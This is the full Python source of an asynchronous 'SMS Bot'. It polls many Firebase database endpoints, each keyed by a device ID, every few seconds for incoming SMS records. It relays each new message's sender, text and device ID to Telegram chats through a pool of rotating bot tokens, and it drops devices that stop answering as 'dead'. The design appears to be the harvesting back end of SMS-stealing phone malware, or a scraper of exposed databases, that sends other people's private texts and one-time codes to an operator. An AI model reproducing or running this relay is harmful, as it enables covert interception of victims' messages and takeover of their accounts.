import asyncio
import json
import logging
import os
import signal
import time
from dataclasses import dataclass, field
from logging.handlers import RotatingFileHandler
from typing import Dict, List, Optional, Set

import aiohttp
from telegram import Bot
from telegram.error import RetryAfter, TelegramError

# --- Constants ---
CONFIG_FILE = "config.json"
DEVICE_IDS_FILE = "device_ids.txt"
FIREBASE_SOURCES_FILE = "firebase_sources.json"
DEAD_DEVICES_FILE = "dead_devices.txt"
DEAD_SOURCES_FILE = "dead_sources.txt"
LOG_DIR = "logs"
LOG_FILE = os.path.join(LOG_DIR, "bot.log")

RELOAD_INTERVAL = 300      # 5 minutes
SCAN_INTERVAL = 5          # 5 seconds
CLEANUP_INTERVAL = 1800    # 30 minutes
STATS_INTERVAL = 300       # 5 minutes
CACHE_TTL = 86400         # 24 hours
DEFAULT_CONCURRENT_LIMIT = 200
REQUEST_TIMEOUT = 10       
DNS_CACHE_TTL = 300

# Edge Optimization Constants
LIMIT_TO_LAST = 5
QUERY_PARAMS = f'orderBy="$key"&limitToLast={LIMIT_TO_LAST}'

# Health Thresholds
MAX_CONSECUTIVE_NULL = 100
MAX_CONSECUTIVE_FAILURES = 10

# --- Logging Setup ---
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        RotatingFileHandler(LOG_FILE, maxBytes=10 * 1024 * 1024, backupCount=5),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# --- Data Models ---

@dataclass(frozen=True)
class SMS:
    id: str
    sender: str
    message: str
    type: str
    date_time: str
    source_name: str
    device_id: str

    def get_dedup_id(self) -> str:
        return f"{self.device_id}:{self.id}"

@dataclass
class FirebaseSource:
    name: str
    type: str  # "per_device" or "global"
    base_url: Optional[str] = None
    url: Optional[str] = None
    consecutive_failures: int = 0
    is_disabled: bool = False

@dataclass
class TelegramBotConfig:
    token: str
    chat_id: str
    id: int = 0
    retry_after: float = 0
    is_down: bool = False

@dataclass
class AppConfig:
    telegram_bots: List[TelegramBotConfig] = field(default_factory=list)
    device_ids: List[str] = field(default_factory=list)
    firebase_sources: List[FirebaseSource] = field(default_factory=list)

# --- Configuration Manager ---

class ConfigManager:
    def __init__(self):
        self.config: Optional[AppConfig] = None
        self.dead_devices: Set[str] = set()
        self.dead_sources: Set[str] = set()

    def load_dead_entities(self):
        if os.path.exists(DEAD_DEVICES_FILE):
            with open(DEAD_DEVICES_FILE, "r") as f:
                self.dead_devices = {line.strip() for line in f if line.strip()}
        if os.path.exists(DEAD_SOURCES_FILE):
            with open(DEAD_SOURCES_FILE, "r") as f:
                self.dead_sources = {line.strip() for line in f if line.strip()}

    def save_dead_device(self, device_id: str):
        self.dead_devices.add(device_id)
        try:
            with open(DEAD_DEVICES_FILE, "a") as f:
                f.write(f"{device_id}\n")
        except Exception as e:
            logger.error(f"Failed to write to {DEAD_DEVICES_FILE}: {e}")

    def save_dead_source(self, source_url: str):
        self.dead_sources.add(source_url)
        try:
            with open(DEAD_SOURCES_FILE, "a") as f:
                f.write(f"{source_url}\n")
        except Exception as e:
            logger.error(f"Failed to write to {DEAD_SOURCES_FILE}: {e}")

    def validate_files_exist(self):
        required_files = [CONFIG_FILE, DEVICE_IDS_FILE, FIREBASE_SOURCES_FILE]
        for f in required_files:
            if not os.path.exists(f):
                logger.critical(f"Configuration file missing: {f}")
                return False
        return True

    async def load_all(self) -> bool:
        if not self.validate_files_exist():
            return False

        self.load_dead_entities()

        try:
            with open(CONFIG_FILE, "r") as f:
                base_cfg = json.load(f)
            
            bot_configs = []
            if "telegram_bots" in base_cfg and isinstance(base_cfg["telegram_bots"], list):
                for idx, b in enumerate(base_cfg["telegram_bots"]):
                    token = b.get("token")
                    chat_id = b.get("chat_id")
                    if not token or ":" not in token:
                        continue
                    bot_configs.append(TelegramBotConfig(token=token, chat_id=chat_id, id=len(bot_configs)+1))
            
            if not bot_configs:
                logger.critical("No valid Telegram bots found.")
                return False

            with open(DEVICE_IDS_FILE, "r") as f:
                device_ids = [line.strip() for line in f if line.strip() and line.strip() not in self.dead_devices]
            
            with open(FIREBASE_SOURCES_FILE, "r") as f:
                fb_data = json.load(f)
                sources = []
                for src in fb_data:
                    if not src.get("name") or not src.get("type"):
                        continue
                    url_key = src.get("base_url") or src.get("url")
                    if url_key in self.dead_sources:
                        continue
                    sources.append(FirebaseSource(**src))

            self.config = AppConfig(
                telegram_bots=bot_configs,
                device_ids=device_ids,
                firebase_sources=sources
            )
            
            logger.info(f"Loaded Telegram Bots: {len(bot_configs)}")
            return True
        except Exception as e:
            logger.error(f"Error loading configuration: {e}")
            return False

    async def reload_loop(self):
        while True:
            await asyncio.sleep(RELOAD_INTERVAL)
            await self.load_all()

# --- Telegram Round Robin Worker ---

class TelegramWorker:
    def __init__(self, bot_configs: List[TelegramBotConfig]):
        self.bots = [Bot(token=b.token) for b in bot_configs]
        self.configs = bot_configs
        self.queue = asyncio.Queue()
        self._stop_event = asyncio.Event()
        self.current_index = 0
        self.pending_queue_ids: Set[str] = set()
        self.lock = asyncio.Lock()

    async def enqueue_sms(self, sms: SMS):
        dedup_key = sms.get_dedup_id()
        async with self.lock:
            if dedup_key in self.pending_queue_ids:
                logger.info(f"Duplicate SMS blocked in queue: {dedup_key}")
                return False
            
            self.pending_queue_ids.add(dedup_key)
            
            text = (
                f"📞 From: {sms.sender}\n\n"
                f"💬 Message:\n{sms.message}\n\n"
                f"📱 Source: {sms.source_name}\n"
                f"🔑 Device ID: {sms.device_id}"
            )
            
            await self.queue.put((dedup_key, text))
            logger.info(f"SMS Enqueued: {dedup_key}")
            return True

    async def run(self):
        logger.info(f"Telegram Delivery Worker Started")
        while not self._stop_event.is_set():
            try:
                queue_item = await self.queue.get()
                dedup_key, message_text = queue_item
                
                sent = False
                now = time.time()
                
                for config in self.configs:
                    if config.is_down and now >= config.retry_after:
                        config.is_down = False
                        logger.info(f"Telegram Bot #{config.id} recovered.")

                for _ in range(len(self.bots)):
                    idx = self.current_index % len(self.bots)
                    self.current_index += 1
                    config = self.configs[idx]
                    bot = self.bots[idx]
                    
                    if config.is_down:
                        continue
                    
                    try:
                        await bot.send_message(chat_id=config.chat_id, text=message_text)
                        logger.info(f"SMS Forwarded via Bot #{config.id}: {dedup_key}")
                        sent = True
                        break
                    except RetryAfter as e:
                        config.retry_after = time.time() + e.retry_after
                        config.is_down = True
                        logger.warning(f"Bot #{config.id} rate limited for {e.retry_after}s.")
                        continue
                    except TelegramError as e:
                        logger.error(f"Bot #{config.id} error: {e}")
                        continue

                if sent:
                    async with self.lock:
                        if dedup_key in self.pending_queue_ids:
                            self.pending_queue_ids.remove(dedup_key)
                    self.queue.task_done()
                else:
                    earliest_bot = min(self.configs, key=lambda c: c.retry_after)
                    wait_sec = max(1, earliest_bot.retry_after - time.time())
                    logger.warning(f"All bots rate limited. Waiting {wait_sec:.1f}s...")
                    await asyncio.sleep(wait_sec)
                    await self.queue.put(queue_item)
                    self.queue.task_done()

            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Unexpected error in Telegram worker: {e}")
                await asyncio.sleep(1)

    def stop(self):
        self._stop_event.set()

# --- Firebase Scanner & Cache ---

class FirebaseScanner:
    def __init__(self, config_mgr: ConfigManager, tg_worker: TelegramWorker):
        self.config_mgr = config_mgr
        self.tg_worker = tg_worker
        self.cache: Dict[str, float] = {}
        self.device_null_counts: Dict[str, int] = {}
        self.primed_urls: Set[str] = set()
        
        # Concurrency & Lock
        self.concurrent_limit = DEFAULT_CONCURRENT_LIMIT
        self.semaphore = asyncio.Semaphore(self.concurrent_limit)
        self.cache_lock = asyncio.Lock()

        # Metrics
        self.scan_durations: List[float] = []
        self.response_sizes: List[int] = []
        self.records_counts: List[int] = []

    def tune_concurrency(self):
        device_count = len(self.config_mgr.config.device_ids)
        needed_limit = (device_count // (SCAN_INTERVAL - 1)) + 10
        if needed_limit > self.concurrent_limit:
            self.concurrent_limit = max(DEFAULT_CONCURRENT_LIMIT, needed_limit)
            self.semaphore = asyncio.Semaphore(self.concurrent_limit)
            logger.info(f"Auto-tuned concurrency to {self.concurrent_limit} for {device_count} devices")

    async def stats_logger_task(self):
        while True:
            await asyncio.sleep(STATS_INTERVAL)
            if not self.config_mgr.config: continue
            
            avg_size = (sum(self.response_sizes) / len(self.response_sizes)) if self.response_sizes else 0
            avg_records = (sum(self.records_counts) / len(self.records_counts)) if self.records_counts else 0
            avg_duration = (sum(self.scan_durations) / len(self.scan_durations)) if self.scan_durations else 0

            stats = (
                "\n" + "-"*30 + "\n"
                "Monitoring Statistics\n"
                f"Active Firebase Sources: {len([s for s in self.config_mgr.config.firebase_sources if not s.is_disabled])}\n"
                f"Active Device IDs: {len(self.config_mgr.config.device_ids)}\n"
                f"Queue Size: {self.tg_worker.queue.qsize()}\n"
                f"Cache Size: {len(self.cache)}\n"
                f"Average Response Size: {avg_size:.1f} bytes\n"
                f"Average Records/Endpoint: {avg_records:.1f}\n"
                f"Average Scan Duration: {avg_duration:.2f}s\n"
                f"Concurrent Limit: {self.concurrent_limit}\n"
                + "-"*30
            )
            logger.info(stats)
            
            # Clear metrics to keep them recent
            self.response_sizes = self.response_sizes[-100:]
            self.records_counts = self.records_counts[-100:]
            self.scan_durations = self.scan_durations[-10:]

    async def cache_cleanup_task(self):
        while True:
            await asyncio.sleep(CLEANUP_INTERVAL)
            now = time.time()
            async with self.cache_lock:
                expired_ids = [k for k, v in self.cache.items() if now - v > CACHE_TTL]
                for k in expired_ids:
                    del self.cache[k]

    async def fetch_json(self, session: aiohttp.ClientSession, url: str, source: Optional[FirebaseSource] = None) -> Optional[dict]:
        async with self.semaphore:
            try:
                # Add optimization query params
                optimized_url = f"{url}?{QUERY_PARAMS}" if "?" not in url else f"{url}&{QUERY_PARAMS}"
                
                async with session.get(optimized_url, timeout=aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)) as response:
                    if response.status == 200:
                        if source: source.consecutive_failures = 0
                        text_data = await response.text()
                        self.response_sizes.append(len(text_data))
                        data = json.loads(text_data)
                        return data if isinstance(data, dict) else None
                    elif response.status in [403, 404]:
                        if source:
                            source.consecutive_failures += 1
                            if source.consecutive_failures >= MAX_CONSECUTIVE_FAILURES:
                                source.is_disabled = True
                                self.config_mgr.save_dead_source(source.base_url or source.url)
                                logger.error(f"Firebase source disabled: {source.name}")
                        return None
            except asyncio.CancelledError:
                raise
            except Exception as e:
                if source: source.consecutive_failures += 1
        return None

    def validate_sms(self, content: dict, sms_id: str, source_name: str, device_id: str) -> bool:
        if not sms_id or not str(sms_id).strip(): return False
        if not content.get("sender") or not str(content.get("sender")).strip(): return False
        if not content.get("message") or not str(content.get("message")).strip(): return False
        return True

    def parse_sms_data(self, data: dict, source_name: str, device_id: str) -> List[SMS]:
        sms_list = []
        if not data: return sms_list
        for sms_id, content in data.items():
            if not isinstance(content, dict): continue
            if content.get("type") == "incoming" and self.validate_sms(content, sms_id, source_name, device_id):
                sms_list.append(SMS(
                    id=str(sms_id),
                    sender=str(content.get("sender")),
                    message=str(content.get("message")),
                    type="incoming",
                    date_time=str(content.get("dateTime", "")),
                    source_name=source_name,
                    device_id=device_id
                ))
        return sms_list

    async def process_endpoint(self, session: aiohttp.ClientSession, url: str, source: FirebaseSource, device_id: str):
        if source.is_disabled: return
        
        is_url_already_primed = url in self.primed_urls
        data = await self.fetch_json(session, url, source)
        
        if not data:
            if device_id != "Global":
                count = self.device_null_counts.get(device_id, 0) + 1
                self.device_null_counts[device_id] = count
                if count >= MAX_CONSECUTIVE_NULL:
                    self.config_mgr.save_dead_device(device_id)
            return
        else:
            if device_id != "Global":
                self.device_null_counts[device_id] = 0

        sms_list = self.parse_sms_data(data, source.name, device_id)
        self.records_counts.append(len(sms_list))
        
        new_records_count = 0
        async with self.cache_lock:
            for sms in sms_list:
                dedup_id = sms.get_dedup_id()
                if dedup_id in self.cache:
                    continue
                
                if is_url_already_primed:
                    success = await self.tg_worker.enqueue_sms(sms)
                    if success:
                        self.cache[dedup_id] = time.time()
                        new_records_count += 1
                else:
                    self.cache[dedup_id] = time.time()
        
        if not is_url_already_primed:
            logger.info(f"Primed endpoint: {url} | Cached: {len(sms_list)} records (Latest Only)")
            self.primed_urls.add(url)
        elif new_records_count > 0:
            logger.info(f"Source {source.name}:{device_id} | SMS Found: {new_records_count}")

    async def run_forever(self):
        logger.info("Scanner Started")
        logger.info("Edge Optimization Enabled")
        logger.info(f"Limit To Last: {LIMIT_TO_LAST}")
        
        self.tune_concurrency()
        
        connector = aiohttp.TCPConnector(limit=self.concurrent_limit, ttl_dns_cache=DNS_CACHE_TTL)
        async with aiohttp.ClientSession(connector=connector) as session:
            while True:
                start_time = time.time()
                await self.do_scan(session)
                duration = time.time() - start_time
                self.scan_durations.append(duration)
                
                wait_time = max(0.1, SCAN_INTERVAL - duration)
                if duration > SCAN_INTERVAL:
                    logger.warning(f"Scan took {duration:.2f}s. Tuning concurrency...")
                    self.tune_concurrency()
                
                await asyncio.sleep(wait_time)

    async def do_scan(self, session: aiohttp.ClientSession):
        cfg = self.config_mgr.config
        if not cfg: return
        
        tasks = []
        for src in cfg.firebase_sources:
            if src.is_disabled: continue
            if src.type == "per_device":
                for dev_id in cfg.device_ids:
                    if dev_id in self.config_mgr.dead_devices: continue
                    tasks.append(self.process_endpoint(session, f"{src.base_url}/{dev_id}.json", src, dev_id))
            elif src.type == "global":
                tasks.append(self.process_endpoint(session, src.url, src, "Global"))
        if tasks:
            await asyncio.gather(*tasks)

# --- Main Application ---

class SMSBot:
    def __init__(self):
        self.config_mgr = ConfigManager()
        self.tg_worker: Optional[TelegramWorker] = None
        self.scanner: Optional[FirebaseScanner] = None

    async def start(self):
        if not await self.config_mgr.load_all(): return

        self.tg_worker = TelegramWorker(self.config_mgr.config.telegram_bots)
        self.scanner = FirebaseScanner(self.config_mgr, self.tg_worker)

        tasks = [
            asyncio.create_task(self.tg_worker.run()),
            asyncio.create_task(self.scanner.run_forever()),
            asyncio.create_task(self.scanner.cache_cleanup_task()),
            asyncio.create_task(self.scanner.stats_logger_task()),
            asyncio.create_task(self.config_mgr.reload_loop())
        ]

        if os.name != 'nt':
            loop = asyncio.get_running_loop()
            for sig in (signal.SIGINT, signal.SIGTERM):
                loop.add_signal_handler(sig, lambda: asyncio.create_task(self.shutdown(tasks)))

        logger.info("SMS Bot is fully operational")
        try:
            await asyncio.gather(*tasks)
        except asyncio.CancelledError:
            pass
        finally:
            await self.shutdown(tasks)

    async def shutdown(self, tasks):
        if self.tg_worker: self.tg_worker.stop()
        for task in tasks:
            if not task.done(): task.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)

async def main():
    bot = SMSBot()
    try:
        await bot.start()
    except (KeyboardInterrupt, asyncio.CancelledError):
        pass

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
